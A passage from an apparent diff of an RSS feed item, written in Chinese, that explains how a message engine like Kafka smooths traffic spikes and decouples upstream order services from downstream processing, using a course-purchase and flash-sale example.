+这里的答案是削峰填谷。所谓的削峰填谷就是指缓冲上下游瞬时突发流量，使其更平滑。特别是对于那种发送能力很强的上游系统，如果没有消息引擎的保护，脆弱的下游系统可能会直接被压垮导致全链路服务雪崩。但是，一旦有了消息引擎，它能够有效地对抗上游的流量冲击，真正做到将上游的峰填满到谷中，避免了流量的震荡。消息引擎系统的另一大好处在于发送方和接收方的松耦合，这也在一定程度上简化了应用的开发，减少了系统间不必要的交互。
+举个简单例子来说，比如购买课程，每门课程都有一个专门的订阅按钮，点击之后进入到付费页面。这个流程可以简单的看成这样：点击订阅按钮调用订单系统生成对应的订单，这是上游。处理该订单会依次调用多个子系统服务 ，比如调用支付宝和微信支付的接口、查询你的登录信息、验证课程信息等，这是下游。显然上游的生成订单的操作比较简单，它的TPS要远高于处理订单的下游服务，因此如果上下游系统直接对接，势必会出现下游服务无法及时处理上游订单从而造成订单堆积的情形。特别是当出现类似于秒杀这样的业务时，上游订单流量会瞬时增加，可能出现的结果就是直接压跨下游子系统服务。
+解决此问题的一个常见做法是我们对上游系统进行限速，但这种做法对上游系统而言显然是不合理的，毕竟问题并不出现在它那里。所以更常见的办法是引入像 Kafka 这样的消息引擎系统来对抗这种上下游系统 TPS 的错配以及瞬时峰值流量。
+当引入了 Kafka 之后。上游订单服务不再直接与下游子服务进行交互。当新订单生成后它仅仅是向 Kafka Broker 发送一条订单消息即可。类似地，下游的各个子服务订阅 Kafka 中的对应主题，并实时从该主题的各自分区（Partition）中获取到订单消息进行处理，从而实现了上游订单服务与下游订单处理服务的解耦。这样当出现秒杀业务时，Kafka 能够将瞬时增加的订单流量全部以消息形式保存在对应的主题中，既不影响上游服务的 TPS，同时也给下游子服务留出了充足的时间去消费它们。这就是 Kafka 这类消息引擎系统的最大意义所在。</description>
+    </item>
+    
+  </channel>
+</rss>
